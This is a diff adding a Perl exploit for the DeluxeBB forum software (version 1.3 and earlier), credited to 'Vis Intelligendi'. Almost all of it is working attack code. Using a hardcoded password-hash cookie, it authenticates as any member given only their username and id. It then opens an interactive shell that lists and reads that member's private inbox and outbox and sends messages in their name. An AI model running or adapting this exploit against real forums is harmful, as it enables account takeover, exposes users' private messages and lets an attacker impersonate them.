@@ -1,0 +1,183 @@
+======================================================================
+                 DeluxeBB <= 1.3 Private Info Disclosure
+		       Vis Intelligendi
+======================================================================
+VIS INTELLIGENDI http://vis-intelligendi.co.cc
+Un hacker Ë principalmente un filosofo. Conoscenza.
+======================================================================
+
+Explanation:
+details on http://vis-intelligendi.co.cc (search deluxebb)
+
+======================================================================
+
+Perl Exploit :
+
+#!usr/bin/perl
+# DeluxeBB 1.3 <= Info Disclosure ( pm.php )
+#           Vis Intelligendi.
+use LWP::UserAgent;
+use HTTP::Request;
+use Switch;
+
+	my ($site,$membercookie,$memberid) = @ARGV;
+	my $memberpw = '6e6bc4e49dd477ebc98ef4046c067b5f'; #ciao \\ Inutile
+	my $inbox = '/pm?sub=folder&name=inbox';
+	my $outbox = '/pm?sub=folder&name=outbox';
+	my $general = '/pm.php';
+	my $new = '/pm.php?sub=newpm';
+
+ if (@ARGV < 3) { die "\n Usage: perl x.pl site nick id\n\n"; exit; } 
+
+&general;
+
+sub broswer() 
+ {
+      $bro = LWP::UserAgent->new();
+      $bro->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14");
+      $bro->default_header("Cookie" => "membercookie=$membercookie; memberpw=$memberpw; memberid=$memberid");
+ }
+
+sub general() 
+ {
+  &broswer;
+  $req = HTTP::Request->new(GET => $site.$general);
+  my $res = $bro->request($req);
+  $content = $res->content();
+  while ($content =~ /<span class="misctext">(\d*)<\/span><\/td>/g)
+      {
+     push(@pm,$1); 
+   }
+  &splash_gen;
+  &sh;
+ }
+
+
+sub splash() 
+ {
+ print "--------------------------------------------\n";
+ print "       DeluxeBB Info Disclosure <= 1.3      \n";
+ print "             Vis Intelligendi               \n";
+ print "		http://vis-intelligendi.co.cc		\n";
+ print "--------------------------------------------\n";
+
+ }
+
+sub splash_gen() 
+ {
+ system("clear");
+&splash;
+  print "-------------------------------------------\n";
+  print " Site: $site                               \n";
+  print " General Pm of: $membercookie              \n";
+  print "-------------------------------------------\n";
+  print "  Read                Unread     \n\n";
+  print " Inbox :  $pm[1]            $pm[2]          \n";
+  print " Outbox:  $pm[3]            $pm[4]          \n";
+  print " Saves:   $pm[5]            $pm[6]           \n";
+  print " Tracker: $pm[7]            $pm[8]          \n";
+ }
+
+sub sh() 
+ {
+print "\n sh> "; $sh = <stdin>; chomp $sh;
+switch($sh) {
+  case "help" { &sh::help; }
+  case "quit" { system "clear";exit(); }
+  case "inbox" { &inbox; }
+  case "outbox" { &outbox; }
+  case "new" { &newpm; }
+  case "read" { &read; }
+  }
+ }
+
+sub sh::help() {
+system("clear");
+print q(
+-----------------------------
+DeluxeBB <= 1.3 Info Shell
+-----------------------------
+
+help - Leggi questo faq
+quit - Termina exploit
+inbox - Leggi inbox
+outbox - Leggi outbox 
+read - Leggi pm
+new - Scrivi pm
+);
+sleep(3); 
+&splash_gen; &sh;
+ }
+
+sub inbox() 
+ {
+&broswer;
+$req = HTTP::Request->new(GET => $site.$inbox);
+$res = $bro->request($req);
+$content = $res->content();
+while ($content =~ /(pm.php\?sub=view&pid=\d*)">(.*)<\/a>/g) { push(@inbox_l,$1); push(@inbox_t,$2); }
+while ($content =~ /misc.php\?sub=profile&name=(.*)">/g) { push(@inbox_f,$1); }  
+&splash;
+print "--------------------------------------------------\n";
+for my $indice (0..$#inbox_l)
+{
+$inbox_l[$indice] =~ s/amp;//g;
+print " $inbox_l[$indice]  - Title: $inbox_t[$indice]      - From:  $inbox_f[$indice]\n";
+}
+print "--------------------------------------------------\n";
+(@inbox_l,@inbox_t,@inbox_f) = '';
+&sh;
+ }
+
+sub outbox() 
+ {
+&broswer;
+$req = HTTP::Request->new(GET => $site.$outbox);
+$res = $bro->request($req);
+$content = $res->content();
+while ($content =~ /(pm.php\?sub=view&pid=\d*)">(.*)<\/a>/g){  push(@outbox_l,$1);  push(@outbox_t,$2); }
+while ($content =~ /misc.php\?sub=profile&name=(.*)">/g) { push(@outbox_f,$1);}   
+&splash;
+print "--------------------------------------------------\n";
+for my $indice (0..$#outbox_l){
+$outbox_l[$indice] =~ s/amp;//g;
+print " $outbox_l[$indice]  - Title: $outbox_t[$indice]      - To:  $outbox_f[$indice]\n";
+}
+print "--------------------------------------------------\n";
+(@outbox_l,@outbox_t,@outbox_f) = ''; 
+&sh;
+ }
+
+sub read()
+ {
+&broswer;
+&splash;
+print "\nInserire link pm: "; $link = <stdin>; chomp($link);
+$req = HTTP::Request->new(GET => $site.$link);
+$res = $bro->request($req);
+$content = $res->content();
+while ($content =~ /<span class="inputarea"><span class="inputarea">(.*)<\/span><\/span>/g) { push(@pm_r,$1); }
+print "---------------------------------\n";
+print " Reading PM: $site$link         \n";
+print " Of : $membercookie              \n";
+print "---------------------------------\n";
+$pm_r[0] =~ s/<br \/>//g;
+print @pm_r;
+@pm_r = ''; 
+&sh;
+ }
+
+sub newpm
+ {
+system("cls");
+&splash;
+print "\nTo:"; $to = <stdin>;
+print "\nTitle:"; $tit = <stdin>;
+print "\nContent:"; $contnet = <stdin>;
+chomp($to,$tit,$contnet);
+&broswer;
+$res = $bro->post($site.$new,["to" => $to, "subject" => $tit, "posticon" => 'bigsmile.gif', "rte1" => $contnet, "submit" => 'Send']);
+print "\n Sended pm to $to from $membercookie\n ";
+&sh;
+ }
+
